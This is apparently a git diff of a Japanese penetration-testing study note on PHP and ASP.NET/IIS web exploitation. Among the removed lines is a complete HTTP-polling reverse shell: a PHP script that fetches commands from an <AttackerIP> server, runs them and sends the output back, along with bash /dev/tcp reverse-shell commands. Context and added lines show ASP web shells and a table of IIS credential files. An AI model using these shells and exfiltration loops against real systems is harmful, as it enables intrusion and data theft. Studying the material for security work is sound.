@@ -184,7 +184,6 @@ http://example/config.php
 | open_basedir が設定されている               | アクセス可能ディレクトリが制限                          | 設定されたパス外のファイルにアクセス不可                                         | `/var/www/html` 外を探索できない等の制限                                       |
 | safe_mode が On                      | (PHP<5.4) 安全モードが有効                       | 多くの関数・コマンドが制限される                                             | 古い環境でのみ影響。代替手法を探す必要                                                |
 
-
 ### File読み取り
 
 - Web Shellが実行できないときに使用
@@ -306,7 +305,7 @@ http://example/config.php
 |              | `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | PowerShell履歴       |
 
 
-#### phpinfo着眼点
+#### phpinfo 着眼点
 
 ##### 致命的・高リスクな設定（RCE / RFI / LFI）
 
@@ -338,7 +337,6 @@ http://example/config.php
 | `$_SERVER` / `$_ENV` | API Key / Password | 機密情報の漏洩                   | ・ページ下部の環境変数セクション（Environment / PHP Variables）<br>・`AWS_ACCESS_KEY` や `DB_PASSWORD` 等の機密情報が誤って露出していないか確認 |
 | `imagick`            | インストール済み           | ImageTragick (RCE)        | ・ImageMagickのバージョン確認<br>・古い場合、画像処理の脆弱性（CVE-2016-3714等）を利用したRCEが可能                                       |
 
-
 ### SSH鍵書き込みによるエクスプロイト
 
 - 関連ノート：[[22 - SSH#公開鍵一覧の書き換え]]
@@ -363,133 +361,8 @@ echo "Public key added successfully!";
 ?>
 ```
 
-### HTTP Polling による Reverse Shell 構築手順
-
-#### 概要
-
-- ✅ メリット：
-	- TCP Reverse Shell (`bash -i >& /dev/tcp/<AttackerIP>/4444 0>&1`)が使えない環境で有効
-	- HTTP(80/443) は通常許可されている
-	- ファイアウォール・プロキシを回避可能
-
-- ❌ デメリット：
-	- 遅延がある（Polling 間隔分）
-	- ログに記録される
-	- サーバー負荷が高い
-
-- 適用シーン：
-	- アウトバウンド TCP 接続が全てブロックされている
-	- プロキシ経由でしか外部通信できない
-
-#### 手順① 攻撃者側：コマンド配信サーバを立てる
-
-1. 作業ディレクトリ作成
-```zsh
-mkdir poll_shell
-cd poll_shell
-````
-
-2. コマンドファイル作成
-```zsh
-echo "id" > cmd
-```
-- ターゲットに実行させたいコマンドを記述
-- 後から書き換えることで、異なるコマンドを送信可能
-
-3. HTTP サーバ起動
-```zsh
-python3 -m http.server 8888
-```
-- ポート 8888 がブロックされている場合は 80 または 443 を使用
-
-#### 手順② ターゲット側：ポーリング用 PHP をアップロード
-
-1. poll.php を作成・アップロード
-```php
-<?php
-set_time_limit(0); // タイムアウト無効化
-
-$cmd_url = "http://<AttackerIP>:<http_port>/cmd";
-$result_url = "http://<AttackerIP>:<http_port>/result?data=";
-
-while (true) {
-    // コマンド取得（Polling）
-    $cmd = @file_get_contents($cmd_url);
-    if ($cmd !== false && strlen(trim($cmd)) > 0) {
-        // コマンド実行
-        $output = @shell_exec($cmd . " 2>&1");
-        // 結果を攻撃者に送信
-        @file_get_contents($result_url . urlencode($output));
-    }
-    sleep(5); // 5秒ごとにポーリング
-}
-?>
-```
-
-#### 手順③ 実行 & 動作確認
-
-1. ブラウザで poll.php を開く
-```
-http://target.com/poll.php
-```
-- ページは読み込み中のまま（無限ループのため）
-- バックグラウンドで動作し続ける
-
-2. 攻撃者側でHTTP サーバのログを確認
-```
-192.168.1.100 - - [17/Jan/2026 12:34:56] "GET /cmd HTTP/1.1" 200 -
-192.168.1.100 - - [17/Jan/2026 12:34:56] "GET /result?data=uid%3D33%28www-data%29... HTTP/1.1" 200 -
-```
-- 成功の証拠
-	- `GET /cmd` → ターゲットがコマンド取得
-	- `GET /result?data=...` → 実行結果が返ってきた
-
-#### 手順④ コマンドを切り替える
-
-cmd ファイルを書き換えるだけ
-```zsh
-# システム情報取得
-echo "uname -a" > cmd
-
-# ファイル一覧
-echo "ls -la /" > cmd
-
-# ユーザー情報
-echo "cat /etc/passwd" > cmd
-
-# Reverse Shell 起動
-echo "bash -c 'bash -i >& /dev/tcp/<AttackerIP>/4444 0>&1'" > cmd
-```
-- これにより、poll.php が次の Polling で新しいコマンドを取得し、自動実行 → 結果を返送
-
-#### HTTP Pollingトラブルシューティング
-
-- コマンドが実行されない
-	- shell_execが無効化されている可能性
-	- 対処法：`$output = @shell_exec($cmd . " 2>&1");`を次のコマンドに置き換える
-```php
-// 方法1: バッククォート
-$output = `$cmd 2>&1`;
-
-// 方法2: passthru
-ob_start();
-passthru($cmd);
-$output = ob_get_clean();
-
-// 方法3: exec
-exec($cmd, $arr);
-$output = implode("\n", $arr);
-```
-
-- ❌ HTTP サーバに result が来ない
-	- ポート 8888 がファイアウォールでブロック
-	- 対処法：ポート 80/443 で起動
-
 ---
 
-## ASP
-
-- ASP.NET アプリは bin 配下の DLL を自動的にロードする仕組みになっている
 ## ASP / ASP.NET (IIS)
 
 ### 基本 Web Shell
@@ -512,7 +385,6 @@ Response.Write(
 );
 %>
 ```
-
 実行例
 ```
 http://target/shell.aspx?cmd=whoami
@@ -545,19 +417,29 @@ Current Dir: <%= Directory.GetCurrentDirectory() %><br>
 
 ### 重要ファイル（Windows + IIS）
 
+| パス                                                                                        | 内容                                          | ペンテスト的に嬉しいポイント                                                    | 優先度   |
+| ----------------------------------------------------------------------------------------- | ------------------------------------------- | ----------------------------------------------------------------- | ----- |
+| C:\inetpub\wwwroot\web.config                                                             | サイト設定 / 接続文字列                               | DB資格情報取得 → MSSQLログイン、machineKey取得 → ViewState改ざん・認証クッキー偽造、認証方式の把握 | ★★★★★ |
+| C:\Windows\System32\inetsrv\config\applicationHost.config                                 | IIS全体設定                                     | 仮想ディレクトリ・物理パス特定 → 隠しサイト発見・横展開、ハンドラ設定 → 実行可能拡張子把握、認証方式確認           | ★★★★★ |
+| C:\inetpub\wwwroot\bin*.dll                                                               | .NETアセンブリ                                   | dnSpy / ILSpyで逆コンパイル → ハードコード資格情報・内部API・暗号鍵・ファイルパス取得              | ★★★★★ |
+| C:\inetpub\wwwroot\App_Data*.mdf                                                          | ローカルDB                                      | オフライン解析 → ユーザー・ハッシュ取得 → クラック・資格情報再利用、アプリ構造把握                      | ★★★★☆ |
+| C:\inetpub\wwwroot\appsettings.json                                                       | .NET Core設定                                 | DB接続文字列・APIキー・JWTシークレット取得 → APIなりすまし・DB侵入                         | ★★★★☆ |
+| C:\inetpub\wwwroot\Global.asax                                                            | アプリケーションイベント                                | 認証処理・ルーティング理解 → 認可バイパス・攻撃対象エンドポイント特定                              | ★★★☆☆ |
+| C:\Program Files\Microsoft SQL Server\|MSSQL本体                                            | DBファイル・設定取得 → サービスアカウント特定・権限昇格・バックアップから機密取得 | ★★★☆☆                                                             |       |
+| C:\Users*\AppData\Roaming\FileZilla\recentservers.xml                                     | FTP接続履歴                                     | 平文FTP資格情報取得 → 別サーバ侵入・Webroot書き込み・横展開                              | ★★★★☆ |
+| C:\Users*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | PowerShell履歴                                | 実行コマンドから資格情報・内部サーバ・管理操作特定 → lateral movement・権限昇格                 | ★★★★☆ |
 
----
+### DLL アップロードによる RCE
 
-## DLL アップロードによる RCE
+ASP.NET は bin の DLL を自動ロード
 
 条件：
-
 - Webroot書き込み可能
 - /bin に配置可能
 
 理由：
 
-- ASP.NET は bin の DLL を自動ロード
+
 
 ---
 
@@ -612,34 +494,6 @@ txt を ASP として実行可能。
 
 ---
 
-## よくあるミス設定
-
-### 詳細エラー表示 ON
-
-```
-customErrors mode="Off"
-```
-
-→ フルパス漏洩
-
----
-
-### デバッグ有効
-
-```
-debug="true"
-```
-
-→ 情報漏洩
-
----
-
-### requestValidationMode="2.0"
-
-→ 古い検証 → XSS
-
----
-
 ## 認証バイパス
 
 ### web.config
@@ -669,53 +523,6 @@ elmah.axd
 
 ---
 
-## SSRF / LFI 相当
-
-.NET のファイル読み取り：
-
-```csharp
-Server.MapPath()
-File.ReadAllText()
-```
-
----
-
-## ペイロード配置
-
-### LOLBAS
-
-```
-certutil
-msbuild
-installutil
-regsvr32
-mshta
-```
-
----
-
-## 権限昇格チェック
-
-```
-whoami /priv
-```
-
-SeImpersonatePrivilege があれば：
-
-- JuicyPotato
-- PrintSpoofer
-
----
-
-## IIS 特有の横展開
-
-```
-C:\inetpub\wwwroot\
-```
-
-他サイトが入っている。
-
----
 
 ## ログ
 
